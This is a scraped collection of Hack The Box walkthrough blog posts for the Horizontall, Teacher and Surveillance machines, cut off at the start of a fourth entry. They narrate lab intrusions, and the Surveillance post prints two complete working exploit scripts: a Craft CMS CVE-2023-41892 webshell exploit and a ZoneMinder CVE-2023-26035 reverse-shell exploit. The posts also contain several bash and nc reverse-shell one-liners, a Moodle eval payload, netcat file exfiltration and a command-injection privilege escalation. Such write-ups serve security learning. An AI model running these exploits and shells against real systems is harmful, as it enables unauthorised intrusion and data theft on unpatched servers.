        "content": "Horizontall is an easy Linux box created by wall99 on Hack The Box and was released on the 28th Aug 2021. Hello world, welcome to haxez where today I will be going through how I hacked Horizontall. To complete this box it is suggested that you have basic Web Enumeration, Linux Enumeration, and SSH Knowledge. The lessons from this box are Source Code Review and Port Forwarding.\nHorizontall Enumeration\nTo ensure that the box was online and that I could talk to it, I sent a ping request. Since the box responded, I performed a Nmap scan against all ports, with default scripts and requested service versions. As a result, I learnt that ports 22 for SSH and 80 for HTTP were open.\nHorizontall Application Enumeration\nNavigating to the IP address in my browser, I was redirected to the domain horizontall.htb. However, as this domain name doesn’t resolve through DNS I received an error from Burp.\nTo fix this, I echoed the box’s IP address and domain name into my host’s file. As a result, when visiting the domain name the application loaded as expected. The web application appeared to be a commercial website for a website development company. However, the website wasn’t functional as the links and the contact us form didn’t work.\n┌──(kali㉿kali)-[~]└─$ echo \"10.129.234.11 horizontall.htb\" | sudo tee -a /etc/hosts\nNext, I ran whatweb but it didn’t reveal much about the application that Nmap hadn’t already told me. It told me the server was Ubuntu and that the web server was nginx.\n┌──(kali㉿kali)-[~]└─$ whatweb http://horizontall.htb/\nI ran 2 gobuster scans, 1 to look for directories and 1 to look for virtual hosts but unfortunately, neither produced anything interesting. I think I’m running gobuster incorrectly for virtual hosts. I believe there is an –append-word argument that needs to be added but I get an error when doing that. I will have to look into that this evening.\n┌──(kali㉿kali)-[~]└─$ gobuster vhost -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://horizontall.htb -o vhostgobuster.txt -t 50\nHowever, ffuf does find the virtual host. I filtered by a file size of 194 because that was the file size of the generic error response. I’m doing something wrong with gobuster. Since I wouldn’t have found the virtual host, I’m going to ignore these results and continue enumerating. I’m going to search the academy for gobuster this evening.\n┌──(kali㉿kali)-[~]└─$ sudo ffuf -u http://horizontall.htb/ -H \"Host: FUZZ.horizontall.htb\" -w /media/sf_OneDrive/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194\nReturn To The Source\nIt’s where one must go when they’ve run out of ideas. As you can see below, there were references to Cascading Style Sheet files and Javascript files. I decided to take a look at the Javascript files to see if they contained anything interesting.\nHowever, the way the browser rendered the code was horrible so I went to https://beautifier.io/ and pasted in the Javascript. Skimming through the code, I noticed a function called getReviews which pointed to the subdomain api-prod.\nAPI Virtual Host Enumeration\nAfter adding the new virtual host to my host file, I navigated to it in my browser. There wasn’t much to look at other than a welcome message.\nI’m pleased to say that gobuster worked for directory brute forcing. It seems there were 3 subdirectories.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://api-prod.horizontall.htb/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt\nI navigated to the admin directory which rendered a login page. The page revealed that the technology in use was strapi. Next, I visited the reviews page which returned a JSON response from the server showing reviews of the product.\nFollowing the discovery of the technology, I searched for exploits on Exploit Database and found an RCE. In short, the exploit performs a password reset. It’s written in Python and exploits the vulnerability with the CVE designation CVE-2019-18818. The CVE description explains the following.\nstrapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.\nTherefore, I navigated to the /admin/init endpoint to retrieve the service version to determine whether it was vulnerable. The API reported back that it was version 3.0.0-beta.17.4 which suggested it should be.\nHorizontall Foothold\nDon’t you just love it when an exploit just works without having to tinker with it? I copied the code and recreated it locally in a file called exploit.py. Next, I used Python3 to run the code and fed it the URL of the application. Almost immediately, the exploit told me that the password was reset successfully.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ python3 exploit.py http://api-prod.horizontall.htb/\nJust like that, I had code execution and could send myself a reverse shell. First, I set up a netcat listener on my attack box. Next, I ran the following command in the shell on the target machine. Finally, I landed on the box as the strapi user and was able to grab the user flag.\nbash -c 'bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'┌──(kali㉿kali)-[~]└─$ sudo nc -lvnp 9001[sudo] password for kali: listening on [any] 9001 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 46802strapi@horizontall:~/myapi$ ls /homels /homedeveloperstrapi@horizontall:~/myapi$ cat /home/developer/user.txtcat /home/developer/user.txt6e7▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓dc0strapi@horizontall:~/myapi$\nHorizontall Authenticated Enumeration\nFirst, I wanted to establish persistence on the host so I created a .ssh directory in /opt/strapi/.ssh. Next, I created an SSH key using ssh-keygen and echoed the public key into the authorized_keys file. Finally, I gave the SSH private key 600 permissions and used it to SSH to the host. Once I was back on the host I enumerated the listening services and discovered that port 8000 and MySQL were listening locally.\nFirst, I decided to try and get access to MySQL. Starting at the /opt/strapi/ directory, I ran a recursive grep for the word password but was bombarded with noise. After jumping around a few directories I finally found the database password.\nstrapi@horizontall:~/myapi/config$ grep -R passwordenvironments/production/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",environments/development/database.json:        \"password\": \"#J!:F9Zt2u\"environments/staging/database.json:        \"password\": \"${process.env.DATABASE_PASSWORD || ''}\",\nAs a result, I was able to log in to the MySQL database as the development user but this appeared to be a dead end. I queried the database and dumped the contents of the various user tables but couldn’t find any hashes other than the administrators.\nSince MySQL was a dead end, I moved on to see what was listening on port 8000. Using SSH, I performed local port forwarding so that I could access port 8000 via localhost:1234. Upon visiting that port I found a Laravel application.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ ssh -L 1234:localhost:8000 -i key strapi@10.129.234.11\nI ran gobuster to discover directories and was able to identify the /profiles directory. However, the box crapped out shortly after and killed my tunnel.\n┌──(kali㉿kali)-[~]└─$ gobuster dir -u http://localhost:1234/ -w /media/sf_OneDrive/SecLists/Discovery/Web-Content/raft-small-words.txt\nI recreated the tunnel and navigated to the profiles directory. The application appeared broken and had visual debugging enabled. Searching Google for Laravel Debug exploits resulted in finding this payload >>HERE<<which I recreated locally.\nHorizontall Privilege Escalation\nI ran the exploit using the syntax below and the results indicated that Laravel was running as root. I was almost there, all I needed to do now was craft a reverse shell and send it back to myself.\n┌──(kali㉿kali)-[~/HTB/Horizontall/laravel]└─$ python3 exploit.py http://localhost:1234 Monolog/RCE1 id\nI was close to getting it right the first time. You can see from the screenshot below the different payloads I tried before resuming IppSec’s video. I attempted the first two on my own before resuming the video but as soon as he said curl, I paused it again and executed the payload myself. Little victories.\nI created a shell script which contained the following bash script. I then used the exploit with curl to download the file which I then piped to bash to execute it.\n┌──(kali㉿kali)-[~/HTB/Horizontall]└─$ cat shell.sh      #!/bin/bashbash -i >& /dev/tcp/10.10.14.36/9002 0>&1\nBelow, you can see the exact command I used. It needed to be enclosed in single quotation marks. If medium will let me include it that is.\nThis connected back to my netcat listener and allowed me to capture the root flag.\n┌──(kali㉿kali)-[~]└─$ nc -lvnp 9002listening on [any] 9002 ...connect to [10.10.14.36] from (UNKNOWN) [10.129.234.11] 42330bash: cannot set terminal process group (65829): Inappropriate ioctl for devicebash: no job control in this shellroot@horizontall:/home/developer/myproject/public# cat /root/root.txtcat /root/root.txt19c▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓8f4root@horizontall:/home/developer/myproject/public#\nHorizontal Learnings\nThere was certainly a lot to learn from this one. I’m starting to understand the difference between difficult and time-consuming boxes. The time it takes to own a box doesn’t necessarily equate to the difficulty. This box took me a long time to complete but it wasn’t that difficult. Owning this box required exploiting publically known vulnerabilities with available exploits. In my opinion, that is exactly what an easy box should be. It did require a lot of enumeration and knowing what to look for.\nI enjoyed this box a lot, it let me practise techniques I’m familiar with. It introduced me to technologies I hadn’t used before and their vulnerabilities. Furthermore, it also highlighted areas where I need to invest time to improve. Admittedly, I was worried that the different exploits weren’t going to work but I was pleasantly surprised. Overall, this was a great box which I’m probably going to revisit to get a better understanding."
    },
    {
        "title": "Hack The Box Teacher Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-teacher-writeup-31979f830ba1",
        "content": "Teacher is an easy Linux box created by mrh4sh on Hack The Box. The official walkthrough states that it’s a medium box. However, it is categorized as an easy box in the machines section. It is recommended that you have basic Linux and MySQL knowledge to complete this box. By completing this box you will learn Website Enumeration, Password Brute-Forcing, Moodle Quiz Module Exploitation, Database Enumeration, Password Cracking, and Linux Symlink Misconfiguration. Hello world, welcome to Haxez where today I will be explaining how I hacked Teacher.\nTeacher Enumeration\nFirst, I spawned the box and connected my attack box to the Hack The Box VPN. Once connected, I sent a ping request to the box to ensure it was online. Then I performed a Nmap scan to check what ports were open. Furthermore, I requested the service versions, asked for default scripts to be run, and that the minimum packet rate was 10000. Finally, I saved the output in all formats to files called teacher. From the results, I learned that only port 80 for HTTP was open and that it was running Apache 2.4.25.\nsudo nmap -sC -sV -p- 10.129.202.224 --min-rate 10000 -oA teacher\nTeacher Web Application Enumeration\nSince port 80 was the only open port, I headed over to the application. There wasn’t a great deal of functionality offered by the application. It seemed fairly generic with few pages that I could interact with. For an application that calls itself Blackhat Highschool, it seemed a bit too clean. I was hoping for something dark and edgy.\nMoving on, I ran whatweb against the application which told me it was an HTML 5 application with JQuery 1.11.1. Next, I navigated to index pages with various different extensions (index.html, index.php). Sure enough, the one that loaded the main page was index.html.\nAs I didn’t have much to go on, I decided to run gobuster to look for hidden content. Perhaps there was a hidden directory or a secret file telling me that the princess is in another castle. I told gobuster to perform a directory attack using the raft-small-words.txt wordlist in SecLists. Furthermore, I also asked it to try various different extensions and set the thread count to 50.\nAs a result, I learned that there was a directory called Moodle. Their GitHub page explains that Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License. Moodle is used for blended learning, distance education flipped classrooms, and other online learning projects in schools, universities, workplaces, and other sectors. I headed to the Moodle directory but received an error because it redirected to teacher.htb. Therefore, I added the IP address and teacher.htb domain to my /etc/hosts file and revisited the directory. Abracadabra, the site started loading.\nPicture In Picture\nI honestly don’t know what to say about this part of the box. I know I wouldn’t have found it if it wasn’t for a walkthrough. It’s not something I regularly check. I found Moodle but had no way to log in. However, directory listing on the images directory was enabled. Visiting each of the images loaded an image as expected, except for 5.png.\nI downloaded the picture locally and used less to review the contents of the file. It wasn’t an image at all. It appeared to be a helpdesk ticket. I can’t fathom how a helpdesk ticket would have ended up on the website. For my own sanity, I’m going to pretend that the helpdesk agent and web developer are the same person. Furthermore, I’m also going to pretend that they accidentally renamed the wrong file and uploaded it. The ticket gave me the username Giovanni and a partial password of Th4C00lTeacha.\nMoodle Bruteforce\nI launched Burp and headed back to the Moodle login page. Next, I populated the login form with the credentials provided in the support ticket. Then, I clicked submit and located the login request in Burp’s HTTP history. I sent the request to the intruder tool and added a character to the end of the password. Then, I highlighted that character and added the payload characters.\nNext, I navigated to the payload tab but because I’m using Burp community edition, I had to create my own payloads. As a result, I combined several wordlists from the SecLists fuzzing directory so that they contained numbers 0 to 9, all alphabetical characters (lower and uppercase), and all special characters.\nI then click the start attack button and watched as Burp went through each payload, appending it to the end of the password. There are other tools that I could have used to do this such as WFUZZ or FFUF but I know how to use Burp so I thought it was the best option. An indication that a specific payload has had a different result is the length of the response produced by the application. The screenshot below shows that most of the responses were 868 characters. However, the payload with the # symbol produced a response with 993 characters.\nEvil Teacher Vulnerability\nI wasn’t sure what the Moodle version was. I ran what web again against the teacher.htb domain Moodle directory but got nothing. As a result, I looked on Google and found that the Moodle version can be found from the Moodle Docs for this page link at the bottom of a course page. This told me that it was Moodle version 3.4.\nThere is a vulnerability in Moodle 3.4 with the CVE designation CVE-2018–1133. The vulnerability is also known as Evil Teacher. It could allow a user with the teacher role to perform code execution by creating a quiz. SonarSource has an excellent writeup on it so I’m not going to attempt to explain it in too much detail. Essentially, formulas are passed to an eval function which allows for code execution. So if a threat actor can create a quiz with a malicious formula in one of the questions, they may be able to execute code.\nTeacher Foothold\nI navigated to the algebra page and enabled editing. Next, I used the add an activity or resource option to add a quiz to the Topic 1 section.\nI gave the quiz a name and description and clicked next.\nAfter that, I clicked the little blue add link on the next page and chose to add a question. Then, I selected the calculated question type as that would be likely to have the option to add a formula. Finally, I pasted the working exploit into the formula and changed the grad value to 100%.\n/*{a*/`$_GET[0]`;//{x}}\nIt was time for the moment of truth. I captured the request with Burp and sent it to the repeater tool. Next, I appended the URL with a payload that would ping my box. I started tcpdump to listen out for ICMP packets that hit my tun0 adaptor and clicked send.\nGET /moodle/question/question.php?returnurl=%2Fquestion%2Fedit.php%3Fcmid%3D7&appendqnumstring&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=/bin/ping+10.10.14.34 HTTP/1.1\nsudo tcpdump -i tun0 -n icmp\nTo my surprise, it worked the first time. I started receiving ping packets from the target box.\nNow that I had code execution, I modified my payload to a reverse shell, started netcat, and was able to pop a reverse shell.\nGET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D8%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=8&0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.34/9001+0>%261' HTTP/1.1\nTeacher System Enumeration\nI couldn’t find the user flag once logged in so I checked the home directory and that there was a user called giovanna. That’s probably where the user.txt file is. I could try switching to that user with the password we logged in to Moodle with. However, I decided to take a look at the database first. I pulled the username and password from the /var/www/html/moodle/config.php file. After logging in, I was able to grab usernames and password hashes from the mdl_users table.\nselect id,username,password from mdl_user;\nI copied the Giovannibak hash to a file on my attack box and used John to crack it with the rockyou wordlist.\nI was then able to switch to the giovanni user and capture the user.txt flag.\nwww-data@teacher:/var/www/html/moodle$ su giovannisu giovanniPassword: expelledgiovanni@teacher:/var/www/html/moodle$ cd ~/cd ~/giovanni@teacher:~$ lslsuser.txt  workgiovanni@teacher:~$ cat user.txtcat user.txt881▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓823\nTeacher Privilege Escalation\nThe box keeps crashing meaning I have to do the above process all over again. As a result, the following explanation is going to be brief because I simply can’t be bothered with this box anymore. Looking at the time stamps on the user’s home directory I could see that something was changing fairly frequently. I set up a Python webserver and download pspy onto the box. Running pspy I noticed that a backup script was running.\nThe backup script was changing to the /home/giovanni/work directory and then backing up the courses directory. It was then changing the directory to /home/giovanni/work/tmp and changing the permissions to 777.\ngiovanni@teacher:/var/www/html/moodle/question$ cat /usr/bin/backup.sh#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;\nYou may have to forgive me here as I’ve reached the end of my tether. I had to restart the box about 5 times due to it crashing repeatedly. All I did was create a symbolic link from courses to /root. That way, when the script runs, the contents of the root directory will be backed up to work/tmp/courses which will allow me to capture the root flag.\ngiovanni@teacher:~/work$ ln -s /root coursesgiovanni@teacher:~/work$ ls -laSh coursesgiovanni@teacher:~/work$ lscourses  courses.bak  tmpgiovanni@teacher:~/work$ cd tmpgiovanni@teacher:~/work/tmp$ lsbackup_courses.tar.gz  coursesgiovanni@teacher:~/work/tmp$ cd coursesgiovanni@teacher:~/work/tmp/courses$ lsalgebra  root.txtgiovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt63d▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓3cc\nTeacher Learnings\nIronically, I didn’t learn a lot from the teacher box. The Moodle exploit was interesting as I hadn’t done it before but that was about it. Unfortunately, I have to say that this is one of my least favorite boxes that I’ve completed so far. The concept is nice but the box was too flakey, well for me it was anyway. It seemed that the slightest mistake in syntax caused the box to throw a tantrum. This is on a private VIP box too so not like other people were hitting it.\nI think enabling SSH would have made the box more tolerable as it would have allowed quick access to the user. I wouldn’t want this on every box but having to repeat the Moodle exploit every time the box decided to stop responding made me want to quit. Also what was up with the credentials hidden in the image… Oh well, it’s done now and I can put it behind me. Glad I did it but didn’t enjoy it. Thanks for the box!"
    },
    {
        "title": "Hack The Box (Surveillance) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-surveillance-5a0c8f716e53",
        "content": "I’ve been on the Hack The Box platform for many years now and It sharpens my hacking skills. This machine was one of my favorites to hack. It was a Medium level machine and I am proud of myself for owning it. The machine goes over a heavy enumeration that leads to exploiting Craft CMSto get a low-level shell on the server. Privilege escalation was performed by doing a local port-forward with ssh exploiting ZoneMinder.\nThey are always watching you…\nEnumeration:\nI blastedautoreconat the IP and got back only two ports which was sweet. I served up all of my scan results from autorecon to my Python local HTTP server. This helps me stay organized when viewing my results in a web browser.\nsudo $(which autorecon) <Target IP Here>\nIn another terminal window while autorecon is running:\npython -m http.server 80\nNmap Results:\nNmap scan report for 10.10.11.245Host is up, received user-set (0.076s latency).Scanned at 2024-02-13 15:51:45 PST for 72sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\nVisiting the IP in Firefox It was trying to communicate with the domain surveillance.htb. I mapped the domain to the machine's IP in the/etc/hosts file.\nsudo nano /etc/hosts\nRevisiting the IP back in my browser resolved it to the domain and was able to access the page.\nThe company offers Cameras, Intrusion, Perimeter Security, Access Control & Intercom services.\nThe first thing I always do when navigating a web page is analyze it by hitting ctrl-u on my keyboard for the“View Page Source” functionality in Firefox. I had the wappalyzerextension installed also so this gave me some info on what technologies the server was using.\nI did a keyword search in the view page source ctrl-f for “CMS” and came across some version information.\nExploitation:\nDoing some googling of the version I found an exploit on Github that this person spoiled for us since it's related to this machine.\nThanks anyway dude 😏.\n#!/usr/bin/env python3#coding: utf-8# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)# Date: 2023-12-26# Version: 4.0.0-RC1 - 4.4.14# Vendor Homepage: https://craftcms.com/# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14# Tested on: Ubuntu 22.04.3 LTS# Tested on: Craft CMS 4.4.14# Exploit Author: Olivier Lasne# CVE : CVE-2023-41892# References :# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g# https://blog.calif.io/p/craftcms-rceimport requestsimport sys, reif(len(sys.argv) < 2):    print(f\"\\033[1;96mUsage:\\033[0m python {sys.argv[0]} \\033[1;96m<url>\\033[0m\")    exit()HOST = sys.argv[1]if not re.match('^https?://.*', HOST):    print(\"\\033[1;31m[-]\\033[0m URL should start with http or https\")    exit()print(\"\\033[1;96m[+]\\033[0m Executing phpinfo to extract some config infos\")## Execute phpinfo() and extract config info from the websiteurl = HOST + '/index.php'content_type = {'Content-Type': 'application/x-www-form-urlencoded'}data = r'action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\",\"__construct()\":[{\"close\":null}],\"_fn_close\":\"phpinfo\"}}'try:    r = requests.post(url, headers=content_type, data=data)except:    print(f\"\\033[1;31m[-]\\033[0m Could not connect to {HOST}\")    exit()# If we succeed, we should have default phpinfo credits if not 'PHP Group' in r.text: print(f'\\033[1;31m[-]\\033[0m {HOST} is not exploitable.') exit()# Extract config value for tmp_dir and document_rootpattern1 = r'<tr><td class=\"e\">upload_tmp_dir<\\/td><td class=\"v\">(.*?)<\\/td><td class=\"v\">(.*?)<\\/td><\\/tr>'pattern2 = r'<tr><td class=\"e\">\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]<\\/td><td class=\"v\">([^<]+)<\\/td><\\/tr>'tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)document_root = re.search(pattern2, r.text, re.DOTALL).group(1)if 'no value' in tmp_dir: tmp_dir = '/tmp'print(f'temporary directory: {tmp_dir}')print(f'web server root: {document_root}')## Create shell.php in tmp_dirdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'}files = {    \"image1\": (\"pwn1.msl\", \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>    <image>    <read filename=\"caption:<?php @system(@$_REQUEST['cmd']); ?>\"/>    <write filename=\"info:DOCUMENTROOT/shell.php\"/>    </image>\"\"\".replace(\"DOCUMENTROOT\", document_root), \"text/plain\")}print(f'\\033[1;96m[+]\\033[0m create shell.php in {tmp_dir}')r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  # Use the Imagick trick to move the webshell in DOCUMENT_ROOTdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": r\"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmp_dir + r'/php*\"}}}'}print(f'\\033[1;96m[+]\\033[0m trick imagick to move shell.php in {document_root}')r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})if r.status_code != 502:    print(\"\\033[1;31m[-]\\033[0m Exploit failed\")    exit()print(f\"\\n\\033[1;95m[+]\\033[0m Webshell is deployed: {HOST}/\\033[1mshell.php\\033[0m?cmd=whoami\")print(f\"\\033[1;95m[+]\\033[0m Remember to \\033[1mdelete shell.php\\033[0m in \\033[1m{document_root}\\033[0m when you're done\\n\")print(\"\\033[1;92m[!]\\033[0m Enjoy your shell\\n\")url = HOST + '/shell.php'## Pseudo Shellwhile True:    command = input('\\033[1;96m>\\033[0m ')    if command == 'exit':        exit()    if command == 'clear' or command == 'cls':        print('\\n' * 100)        print('\\033[H\\033[3J', end='')        continue    data = {'cmd' : command}    r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})    # exit if we have an error    if r.status_code != 200:        print(f\"Error: status code {r.status_code} for {url}\")        exit()    res_command = r.text    res_command = re.sub('^caption:', '', res_command)    res_command = re.sub(' CAPTION.*$', '', res_command)    print(res_command, end='')\nOkay let's at least do a breakdown of what this exploit code is doing:\nThis Python script is an exploit for a vulnerability (CVE-2023–41892) in Craft CMS, versions 4.0.0-RC1 through 4.4.14, which allows unauthenticated remote code execution (RCE).\n* Usage Check: The script checks if it has been provided with the required command-line argument (the URL of the vulnerable Craft CMS instance).\n* Execute PHPInfo: Sends a request to the target Craft CMS instance to execute phpinfo() and extract configuration information.\n* Extract Configuration: Parses the response from phpinfo() to extract values for upload_tmp_dir and $_SERVER[‘DOCUMENT_ROOT’].\n* Create Shell: Constructs a malicious PHP file (shell.php) with code that allows command execution on the server.\n* Upload Shell: Uploads the malicious PHP file to the target server using a crafted request. It uses an Imagick trick to move the shell to the document root.\n* Interactive Shell: Once the shell is deployed, the script enters an interactive mode where it allows the user to execute commands on the target system through the uploaded shell.\n* Clean-Up: Provides instructions on how to delete the uploaded shell after use.\nsudo git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892cd CraftCMS_CVE-2023-41892python3 craft-cms.py http://surveillance.htb/\nThe shell that was given to me was absolutely trash so I decided to run another reverse shell back to my machine.\nOn my attack machine:\nnc -nlvp 1234\nOn the target machine:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP here> 1234 >/tmp/f/usr/bin/script -qc /bin/bash /dev/null\nPost-Exploitation:\nThe next step for me since I was only www-data, wasto enumerate the system for password files, etc. I pushed linpeas onto the machine and found some juicy stuff that led me to an insane amount of rabbit holes.\nSorry, Alice sometimes it be like that.\nI took note of the passwords discovered and connected to the MySQL databases found password hashes tried to break them and got nothing…\nLooking back at my Linpeas results I found this interesting file:\nvar/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip\nI pushed the file onto my machine so I could analyze it further.\nOn my attack machine:\nnc -l -p <port>  > surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOn the target machine:\nnc <attackers ip> <port> < surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOpened the file with gedit and did a ctr-f related to users that I found on the system or passwords and came across a hash for Matthew.\nRan a hash-identifier to discover what type of hash I was working with and it was SHA-256.\nThrew the hash into a file ran Johnny Boy the Ripper on it and then sshd onto the machine.\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256\nNice password Matthew you nerd!\nusername: matthewpassword: starcraft122490\nsudo ssh -oHostKeyAlgorithms=+ssh-dss matthew@10.10.11.245\nI ran linpeas again and revisited the section where it highlighted open active ports and port 8080 was interesting to me.\nTo access this port I needed to do an SSH Local Port Forward. A local Port redirects traffic from a local port on the client machine to a specified port on a remote server through an SSH connection.\nOn my attack machine I ran:\nssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245\nVisited my localhost IP in a browser on port 2222 and was presented with a ZoneMinder login page.\nLike any great hacker would do next I googled for any exploits out there available for ZoneMinder and came across yet another RCE-related exploit.\nsudo git clone https://github.com/rvizx/CVE-2023-26035cd CVE-2023-26035nc -nlvp 7777python3 exploit.py -t http://127.0.0.1:2222/ -i <your Attacker IP here> -p 7777\nLet’s break down this exploit code also:\nimport reimport requestsfrom bs4 import BeautifulSoupimport argparseimport base64# CVE-2023-26035 - Unauthenticated RCE in ZoneMinder Snapshots# Author : Ravindu Wickramasinghe | rvz (@RVIZX9)class ZoneMinderExploit:    def __init__(self, target_uri):        self.target_uri = target_uri        self.csrf_magic = None    def fetch_csrf_token(self):        print(\"[>] fetching csrt token\")        response = requests.get(self.target_uri)        self.csrf_magic = self.get_csrf_magic(response)        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\\d+', self.csrf_magic):            print(f\"[>] recieved the token: {self.csrf_magic}\")            return True        print(\"[!] unable to fetch or parse token.\")        return False    def get_csrf_magic(self, response):        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)    def execute_command(self, cmd):        print(\"[>] sending payload..\")        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}        response = requests.post(f\"{self.target_uri}/index.php\", data=data)        print(\"[>] payload sent\" if response.status_code == 200 else \"[!] failed to send payload\")    def exploit(self, payload):        if self.fetch_csrf_token():            print(f\"[>] executing...\")            self.execute_command(payload)if __name__ == \"__main__\":    parser = argparse.ArgumentParser()    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')    parser.add_argument('-ip', '--local-ip', required=True, help='local ip')    parser.add_argument('-p', '--port', required=True, help='port')    args = parser.parse_args()    # generating the payload    ps1 = f\"bash -i >& /dev/tcp/{args.local_ip}/{args.port} 0>&1\"      ps2 = base64.b64encode(ps1.encode()).decode()    payload = f\"echo {ps2} | base64 -d | /bin/bash\"    ZoneMinderExploit(args.target_url).exploit(payload)\nThis Python script is an exploit for (CVE-2023–26035), which is an unauthenticated Remote Code Execution (RCE) vulnerability in ZoneMinder Snapshots.\n* The script imports necessary modules: re for regular expressions, requests for making HTTP requests, BeautifulSoup from the bs4 library for parsing HTML, argparse for parsing command-line arguments, and base64 for encoding payloads.\nZoneMinderExploit Class:\n* This class encapsulates the exploit logic:\n* The __init__ method initializes the target URI and CSRF token.\n* The fetch_csrf_token method sends a GET request to the target URI to fetch the CSRF token from the HTML response.\n* The get_csrf_magic method parses the HTML response to extract the CSRF token.\n* The execute_command method sends a POST request with a payload to execute arbitrary commands on the target.\n* The exploit method orchestrates the exploit by fetching the CSRF token and executing the payload.\nPayload Generation:\n* The script parses command-line arguments to obtain the target URL, local IP, and port.\n* It generates a payload (ps1) that establishes a reverse shell connection to the specified local IP and port using bash.\n* The payload is encoded using base64 (ps2), and a final payload is constructed to decode and execute the payload using base64 and bash.\nCommand-Line Argument Parsing:\n* The script uses argparse to parse command-line arguments, expecting the target URL, local IP, and port.\nExploit Execution:\n* The script instantiates the ZoneMinderExploit class with the target URL and calls the exploit method, passing the generated payload.\n* The exploit fetches the CSRF token and then executes the payload to establish a reverse shell on the target system.\nThe first thing I always do and I mean always is run sudo -l .\nThis had me chasing my tail for a while and had no idea how to abuse this. Eventually, I decided to look in the /usr/bin directory for all zm related scripts and found zmupdate.pl .\nDid some reverse engineering on this file and saw that the user= argument parameter was vulnerable to an injection attack. So I ran the file passed my injection to the user argument and got a shell as root!\nsudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023\nThe shell was super buggy and couldn't run anything as root so I did another reverse shell back onto my machine and got a stable shell.\nOn the target machine after running the exploit:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 3333 >/tmp/f"
    },
    {
        "title": "Keep Calm and Hack The Box — Lame | by Sonya Moisset",
